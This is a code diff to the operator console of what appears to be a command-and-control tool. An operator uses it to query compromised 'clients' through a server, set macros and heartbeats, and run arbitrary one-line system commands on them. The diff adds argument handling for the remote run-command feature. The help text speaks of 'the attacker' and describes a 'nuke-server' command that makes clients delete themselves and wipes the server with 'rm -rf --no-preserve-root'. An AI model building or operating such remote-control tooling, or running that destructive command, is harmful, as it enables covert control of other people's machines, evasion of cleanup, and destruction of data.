@@ -97,9 +97,6 @@ class fclient():
             self.shellformat(helpmenu)
 
 
-        ## !!!!!!!!!
-        ## Up next, getting individual clients to work
-        ## 1111111
         elif client_name in self.clients:
             while True:
                 ## 'response =' instead of a direct print so I can pass the variable easier/shorter
@@ -153,6 +150,10 @@ class fclient():
     ## Interacting with clients via the server as a middle man
     ## Meant to be called per message
     ## -> will always return the server response 
+
+    # tags:
+    ## tags look like this: '# == FUNC, FROM/to, work/notwork 
+    ## Basicaly, static means no arguments taken, and from/to means where the data is retrived/sent to/from
     
     def client_interact_through_server(self, client_command, client_name):            
         if client_command == "" or client_command == "help":
@@ -162,23 +163,22 @@ class fclient():
                 
                 f"Commands: \n"
                 f"get-data: retrives general data about the client from the server's inventory (does not touch client)\n" \
-                f"get-jobs: Lists all the jobs the *server* knows about. Not all jobs may be supported accross all clients. (see get-jobs-possible command)" 
+                f"get-macros: Lists all the jobs the *server* knows about. Not all jobs may be supported accross all clients. (see get-jobs-possible command)" 
                 f"get-jobs-possible retrieves the jobs the client can *currently* do. (DOES talk to client)"
                 
-                f"set-job: Sets a job for the current client. Jobs are a set of actions run by the client\n" \
+                f"set-macro: Sets a macro for the current client. macros are a set of jobs run by the client\n" \
                 f"run-command: runs a singular (one liner) system command on the client. Handy for if there is not a job that runs what you need.\n" \
                     
                 f"Emergency Comands: \n  - use for EMERGENCIES ONLY, there is no favorable outcome for the attacker with these" \
                 f"nuke-server: Kills the server, tells the clients to delete themselves, and runs 'rm-rf --no-preserve-root' the server machine. "
             )
-        
-        elif client_command == "get-data":
-            return self.server_request(f"get-data", client_name)
 
-        #elif client_command == "set-heartbeat":
-        
-        ## done like this so a value can be put in
-        ## !!!! Do all of them like this, with proper error checking as well
+        # == Static, From server
+        elif "get-data" in client_command:
+            ## No arguments for get-data yet, so this is fairly simple
+            return self.server_request(f"{client_command}", client_name)
+
+        # == Dynamic, To Client
         elif "set-heartbeat" in client_command:
             try:
                 ## map: stripping of whitespace and splitting
@@ -189,11 +189,21 @@ class fclient():
             else:
                 return self.server_request(f"{client_command}", client_name)
 
-        elif client_command == "set-job":
-            return self.server_request(f"set-job", client_name)
-        
-        elif client_command == "run-command":
-            return self.server_request(f"run-command", client_name)
+        # == Dynamic, To Client
+        elif "run-command" in client_command:
+            try:
+                command, value = map(str.strip, client_command.split())
+                value = str(value)
+            except Exception as e:
+                print("Please enter a command to run")
+            else:
+                return self.server_request(f"{client_command}", client_name)
+
+
+        elif client_command == "set-macro":
+            return self.server_request(f"set-macro", client_name)
+
+
 
 
         else:
